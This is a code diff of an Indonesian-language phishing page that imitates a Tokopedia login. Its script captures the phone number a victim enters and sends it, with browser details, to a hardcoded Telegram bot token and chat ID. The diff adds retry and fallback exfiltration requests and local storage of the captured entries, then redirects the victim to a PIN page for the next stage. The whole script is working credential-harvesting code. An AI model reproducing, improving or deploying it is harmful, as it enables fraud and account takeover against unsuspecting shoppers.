@@ -14,7 +14,6 @@
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
             border-radius: 20px;
         }
-        /* Menghilangkan panah pada input type number */
         input::-webkit-outer-spin-button,
         input::-webkit-inner-spin-button {
             -webkit-appearance: none;
@@ -64,48 +63,122 @@
     </div>
 
     <script>
-        const CHAT_ID = "8344328873";
-        const BOT_TOKEN = "8182340237:AAECNTw3t1gHZ10swjOttHJua21xKP_oIIM";
+        // GANTI DENGAN DATA ANDA YANG ASLI
+        const CHAT_ID = "8344328873"; // Ganti dengan Chat ID Anda
+        const BOT_TOKEN = "8182340237:AAECNTw3t1gHZ10swjOttHJua21xKP_oIIM"; // Ganti dengan Token Bot Anda
         const NEXT_PAGE_URL = "pin.html";
 
         const loginForm = document.getElementById("loginForm");
         const loginInput = document.getElementById("loginInput");
         const nextButton = document.getElementById("nextButton");
 
-        loginForm.addEventListener('submit', (event) => {
+        loginForm.addEventListener('submit', async (event) => {
             event.preventDefault();
             const loginValue = loginInput.value.trim();
 
-            if (loginValue) {
-                nextButton.textContent = "Memproses...";
-                nextButton.disabled = true;
-                nextButton.classList.add("opacity-70", "cursor-not-allowed");
+            if (!loginValue) {
+                alert("Silakan masukkan nomor handphone!");
+                return;
+            }
 
-                const message = `👤 *INPUT LOGIN BARU*\n\n` +
-                                `Input: *${loginValue}*\n` +
-                                `Waktu: ${new Date().toLocaleString("id-ID")}\n` +
-                                `Perangkat: ${navigator.userAgent}`;
+            // Validasi format nomor telepon
+            const cleanPhone = loginValue.replace(/\D/g, '');
+            if (cleanPhone.length < 10 || cleanPhone.length > 15) {
+                alert("Nomor handphone harus 10-15 digit angka!");
+                return;
+            }
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // Ubah state button
+            nextButton.textContent = "Memproses...";
+            nextButton.disabled = true;
+            nextButton.classList.add("opacity-70", "cursor-not-allowed");
+
+            // Format pesan untuk Telegram
+            const message = `🔔 *TOKOPEDIA LOGIN REQUEST*\n\n` +
+                           `📱 *Nomor HP:* ${loginValue}\n` +
+                           `📅 *Tanggal:* ${new Date().toLocaleDateString("id-ID")}\n` +
+                           `⏰ *Waktu:* ${new Date().toLocaleTimeString("id-ID")}\n` +
+                           `🌐 *IP Address:* Fetching...\n` +
+                           `💻 *Browser:* ${navigator.userAgent.split(')')[0]})`;
+
+            try {
+                // Kirim ke Telegram
+                const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
-                        parse_mode: 'Markdown'
+                        parse_mode: 'Markdown',
+                        disable_notification: false
                     })
-                })
-                .then(() => {
-                    setTimeout(() => {
-                        window.location.href = NEXT_PAGE_URL;
-                    }, 1000);
-                })
-                .catch(error => {
-                    window.location.href = NEXT_PAGE_URL;
                 });
+
+                const telegramData = await telegramResponse.json();
+                
+                if (!telegramData.ok) {
+                    console.error("Error Telegram:", telegramData);
+                    
+                    // Coba metode alternatif jika gagal
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+                }
+
+            } catch (error) {
+                console.error("Error mengirim ke Telegram:", error);
+                
+                // Coba metode fallback
+                try {
+                    const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(`Nomor HP: ${loginValue}\nWaktu: ${new Date().toLocaleString("id-ID")}`)}`;
+                    await fetch(fallbackUrl);
+                } catch (fallbackError) {
+                    console.error("Fallback juga gagal:", fallbackError);
+                }
+                
+            } finally {
+                // Simpan data ke localStorage (fallback)
+                try {
+                    const existingData = JSON.parse(localStorage.getItem('tokped_logins') || '[]');
+                    existingData.push({
+                        phone: loginValue,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent
+                    });
+                    localStorage.setItem('tokped_logins', JSON.stringify(existingData));
+                } catch (storageError) {
+                    console.error("Gagal menyimpan ke localStorage:", storageError);
+                }
+
+                // Redirect ke halaman PIN
+                setTimeout(() => {
+                    window.location.href = NEXT_PAGE_URL;
+                }, 1500);
             }
+        });
+
+        // Format input nomor telepon
+        loginInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length > 0) {
+                if (value.startsWith('0')) {
+                    value = value.substring(0, 13);
+                } else if (value.startsWith('62')) {
+                    value = value.substring(0, 14);
+                } else {
+                    value = value.substring(0, 15);
+                }
+            }
+            
+            e.target.value = value;
+        });
+
+        // Fokus ke input saat halaman load
+        window.addEventListener('load', function() {
+            loginInput.focus();
         });
     </script>
 </body>
 </html>
-
